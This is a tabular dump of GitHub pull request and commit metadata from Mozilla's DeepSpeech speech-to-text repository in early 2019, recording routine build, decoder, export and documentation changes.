2323,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b976032416608fd260cb85ce77a01e64986082d4,"Merge pull request #1800 from lissyx/bump-v0.4.0-alpha.3

Bump VERSION to 0.4.0-alpha.3"
2324,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,924c144927cd0c6a14c7c63edf364dad4e05fe16,"Improve first user experience for CUDA deps

Fixes #1798

X-DeepSpeech: NOBUILD"
2325,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da608dc26dd735bfa7317908940f8dd7ae907a40,"Merge pull request #1799 from lissyx/better-cuda-doc

Improve first user experience for CUDA deps"
2326,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e617ea6f1b91ebbbde09ac50755b1a2677c5e1d,"Fetch ds_ctcdecoder from VERSION-based URL by default

Fixes #1801"
2327,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e549f8978eeceb31bd2084f699a155c0e97a30cc,"Merge pull request #1802 from lissyx/ds_ctcdecoder-download-branch

Fetch ds_ctcdecoder from VERSION-based URL by default"
2328,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce551f53858b71861e6ae02f4b9778a294f68ef5,"Merge pull request #1791 from mozilla/fix-alphabet-handling

Fix handling of Alphabet around evaluate.py"
2329,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa7cb1a983c031042ca2da73cb782deb2d0aad6b,Update decoder hyperparameters
2330,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39efa24d7dca8ffd42556211aa885b0795e1151e,Add lock bot config
2331,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,371bdcc24ef82d01e26677a190198e2ab4f20365,Update README.md
2332,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c1315b1b7d9380104fe46ecf9d888d22a0aeb6f,Update prod tests expected output for new decoder hyperparameters
2333,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1934,1934,Remove unused configurations and add interface docs,"Removed unused build configurations to avoid: https://discourse.mozilla.org/t/compiling-for-windows/32939/64

Added the missing doc of the interface, and chanaged the interface to be disposable.

@lissyx  or @reuben please review :) ",carlfm01,32177100,2019-03-05T03:46:51Z,COLLABORATOR,True,68,21,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a3b8e33d2d967eed68ea13d77b209e2c869f7ca,Add CSharp interface docs
2334,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1934,1934,Remove unused configurations and add interface docs,"Removed unused build configurations to avoid: https://discourse.mozilla.org/t/compiling-for-windows/32939/64

Added the missing doc of the interface, and chanaged the interface to be disposable.

@lissyx  or @reuben please review :) ",carlfm01,32177100,2019-03-05T03:46:51Z,COLLABORATOR,True,68,21,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a20c17bc48beff0a6e83cfbe71e91babba0abf84,Change CSharp clients to use disposable interface
2335,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1934,1934,Remove unused configurations and add interface docs,"Removed unused build configurations to avoid: https://discourse.mozilla.org/t/compiling-for-windows/32939/64

Added the missing doc of the interface, and chanaged the interface to be disposable.

@lissyx  or @reuben please review :) ",carlfm01,32177100,2019-03-05T03:46:51Z,COLLABORATOR,True,68,21,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ff17dfa03a2805b61ca9d654fe783b60507af73,"Remove unused configurations from CSharp projects

Fixes:
https://discourse.mozilla.org/t/compiling-for-windows/32939/65?u=carlfm01"
2336,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1932,1932,skip file header of CSV file when reading alphabet,"When reading in a CSV, this script (in error) has been reading in the characters from the header.

For English and most Roman alphabet languages, this isn't noticed, but for non-Roman alphabets we end up adding the unique letters of the column header `transcript` into the alphabet.

This small fix just skips over the header.",JRMeyer,8389864,2019-03-04T23:59:24Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,584312540b9266da57cd517954d030c6476a1c71,skip file header of CSV file when reading alphabet
2337,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5b09b04e9b707e60485af6bd88663f47a1f3218,WIP utf-8 target
2338,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e05f1eb6c90b160ca9180ad5aad479233b02c03,utf8
2339,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06fbec6e0ddaa52b0cf98f7ee310629b22aa14c6,utf8 slovenian
2340,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94cd473251dc993a41448e4f75de42a24ff3216e,rm .install
2341,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a59865c7c780560dca5da7490288f04a6eab73d,type
2342,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6eb9f1a0b891cca5d6ee616ab535b409581e4e49,"rebasing onto master

utf8"
2343,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c556d5dab0edf66346d2e5bc4ab66910efd63dff,"utf8 slovenian

rm .install

type

cluster-things

sl"
2344,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5d7386959ecd3b7c7d0132fd21fc095021f23bb,merge-remote
2345,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddc1f544ebe4b0b454b587703ed69b0bfc04308,script to make alphabet/lm/trie on cluster
2346,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a773133c7fceacade536df0192401b66f47267c,lm from scratch:)
2347,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34d9f9a02a7e35f215c50bc885f5937dc818f75e,kenlm fun
2348,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9845775d83fec05c120257453ca034d27b0466b,utf8-zh
2349,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09d81028880c999ddcb531b5dbf56dc1ff02a1fc,cleaning
2350,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,597f9c0095e804f844329146c389cf2ed1c96ea8,taskcluster
2351,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5bed887ddc7cd05dff8955f1ff7a40bd4c9d101,remove bazel
2352,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6ddd58c6f7a71aa2bcfc904c87f11bf649d79399,moving files / binaries onto server
2353,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7f266959208a535be0bdbe4b29a5855df8bbc98,trains:)
2354,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd7c07a8fb9864bed28ff3dea0b3bf44795c1774,native_client without compiled c++
2355,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,530ba2d0db651564481fa9366503a4fe6bb342c8,got kenlm / generate_trie / ds_ctcdecode all on server... running from abs-paths now
2356,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,059408428195ac2b1a4d6ada0bbc4e9c09c2c7aa,wheel
2357,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac3416ef7ef5f9573e5e90fad13906a3e8f1ffb2,"utf-8 working, trying with and without scorer in evatluate.py"
2358,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d85d178b4619dba37d97bbd5090712d9ef27cf0a,scorer
2359,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb8e90fdadbe8ffe85049ec197c993bc00848796,test-output-file
2360,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6079dcef3a297058d95327bc75d24ca9b080a32f,test-output-file
2361,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bd30d17ce4ce719a361c5baa9217279a5cf0201,decoder bytes
2362,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1929,1929,DO NOT MERGE - bytes decoder,,JRMeyer,8389864,2019-03-03T21:50:50Z,CONTRIBUTOR,False,289,136,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,13d8a4c7a5f7b12c8fa68beaabbba62b65eded2b,split_byte_str still not the solution
2363,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1928,1928,Fix import_cv2 binary file,"Hello! 👋

I've been recently trying to work with `import_cv2` and I've needed to make some small changes to get it works:
- Missing `.mp3` extension
- Permission 644 -> 755
- *(Formatting blank spaces)*

Thanks for making Speech-To-Text open source 💪 ",qboot,20137632,2019-03-03T16:45:00Z,CONTRIBUTOR,True,11,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,179ba1b5339b24087065ae0d344208d3542c2f0a,Fix import_cv2.py binary file + permissions
2364,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1926,1926,enable dynamic batch size through --export_batch_size -1 (see #1923),"Usage: `$ CUDA_VISIBLE_DEVICES="""" python DeepSpeech.py --notrain --notest --export_dir /path/to/models/ --checkpoint_dir /path/to/checkpoints/ --n_steps -1 --export_batch_size -1`

from client side:
```
tf_logits = session.graph.get_tensor_by_name('import/logits:0')
tf_input_node = session.graph.get_tensor_by_name('import/input_node:0')
tf_input_lengths = session.graph.get_tensor_by_name('import/input_lengths:0')
logits = tf_session.run(tf_logits, feed_dict={
    tf_input_node: pad_to_dense(windows),
    tf_input_lengths: features_lengths,
})
```",nicolaspanel,2500584,2019-03-01T17:57:22Z,CONTRIBUTOR,True,27,9,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7f8e4af213888040c1d79de70379b271b575159,enable dynamic batch size through --export_batch_size -1 (see #1923)
2365,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1925,1925,Update to libssl 1.0.2g-1ubuntu4.14,,lissyx,1645737,2019-03-01T16:23:26Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c3401ec602135c45e55fc9e573243a8778a457b,Update to libssl 1.0.2g-1ubuntu4.14
2366,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1924,1924,add `export.py` util,"usefull if model was exported with inappropriate `n_steps` or `export_batch_size`
NOTA BENE: model is built using the last checkpoint",nicolaspanel,2500584,2019-03-01T15:45:27Z,CONTRIBUTOR,False,22,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc124041d7b338b9d415f1eaec89577af9a0f588,"add `export.py` util

usefull if model was exported with inappropriate `n_steps` or
`export_batch_size`
NOTA BENE: model is built using the last checkpoint"
2367,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1922,1922,allow custom export_batch_size (see #1920),"NB: for now `export_batch_size` must be greater than or equal to 1 due to https://github.com/mozilla/DeepSpeech/blame/master/DeepSpeech.py#L672 and https://github.com/mozilla/DeepSpeech/blame/master/DeepSpeech.py#L703

It would be nice to enable dynamic `batch_size` but outside the scope of this PR

BTW, 
flag `export_batch_size` was already there but was not used. see https://github.com/mozilla/DeepSpeech/blame/master/util/flags.py#L65",nicolaspanel,2500584,2019-03-01T14:13:24Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a10ed6971c7ac7556000bf92bbad1d0ea371559,allow custom export_batch_size (see #1920)
2368,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1921,1921,Building on Windows,,lissyx,1645737,2019-03-01T11:44:55Z,COLLABORATOR,True,1234,91,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75149f33df620ef40d5f642c550e3b6e22513d27,"Building on Windows

Fixes #1793
Fixes #1794"
2369,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1921,1921,Building on Windows,,lissyx,1645737,2019-03-01T11:44:55Z,COLLABORATOR,True,1234,91,44,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30287c5ded703b5815d47d5da4d12bb1a9d0acff,Update TensorFlow r1.12
2370,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1cea2b0fe88b888ae8bbbb4cbe2743c1a6087552,Rewrite input pipeline to use tf.data API
2371,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,51f80744c67819543e0ce46ee05e3971f3c4f285,Remove DS_AudioToInputVector and dep on c_speech_features
2372,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12fe93bfe48f8ec15d6ea6ed0f6bf14a91910cc2,Remove c_speech_features and kiss_fft130 code
2373,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7bbd4a70fcdc8096551bf0f24e0a7617443df01,Fix illegal summary names
2374,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6632504ad164fe02c37bb9222121dd48ee510245,Don't overwrite exported graph from training task with the TFLite version
2375,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6babfb8f3dc707473345664eb145128c6587272,Speed up training tests and make sure they fully converge
2376,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e9e78fefe356a0ef91e81086112f6cfbfa8c045,Infer number of MFCC features from input shape
2377,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7cda8e761a8f3446730cd19a8e019c4873a6573,Add version info to exported graphs
2378,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,232df740dbe290e7702263cda7c7555df54cf43b,Fix TFLite bug in feature computation graph and clean up deepspeech.cc a bit
2379,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed15caf3c5916216bd2ed9c26a422d64da0f15d1,Check if train/dev/test files were passed in instead of having explicit flags
2380,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d70753cc0fd781b2f79f0deafe9db1d717823eca,Use TASKCLUSTER_TMP_DIR instead of hardcoding /tmp
2381,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ee856d075cd1a41f0f7f48dcbcef2935474e207,Clarify early stopping dependency on validation
2382,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1919,1919,Implement input pipeline with tf.data API,Creating a PR to run tests and see how this does in its current state.,reuben,477142,2019-02-28T20:18:29Z,MEMBER,True,814,6835,68,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6154150317eab0e1607e1b917e2d4be439b313c8,Pass missing dropout rate parameters
2383,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1918,1918,Remove unnecessary read key,The readkey is keeping DS process alive.,carlfm01,32177100,2019-02-28T19:10:37Z,COLLABORATOR,True,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,21fbbc689bb8a863358153cb296406cada438cfa,"Remove unnecessary read key

The readkey is keeping DS process alive."
2384,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1917,1917,Factor EXPECTED_TENSORFLOW_VERSION,,lissyx,1645737,2019-02-28T17:57:42Z,COLLABORATOR,True,6,5,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d993674ac1795dfccd41d724ae0241c4f7a626f4,Factor EXPECTED_TENSORFLOW_VERSION
2385,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1916,1916,Add NuPKG spec files and folder structure,,reuben,477142,2019-02-28T14:56:12Z,MEMBER,True,60,0,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95290530e2287323973f5f5a1035fcce71511a5c,Add NuPKG spec files and folder structure
2386,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1915,1915,Improved Nodejs streaming inference with VAD and FFmpeg,,igorfritzsch,7942067,2019-02-28T09:10:14Z,CONTRIBUTOR,True,98,38,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8169160b6a05f9a5cec4540e5372d340fb290b8,Improved Nodejs streaming inference with VAD and FFmpeg
2387,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1914,1914,short readme for data dir,,JRMeyer,8389864,2019-02-28T00:43:50Z,CONTRIBUTOR,True,9,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,715b8c52ec292c693aa6e397bb5a5f1aad65fb0c,short readme for data dir
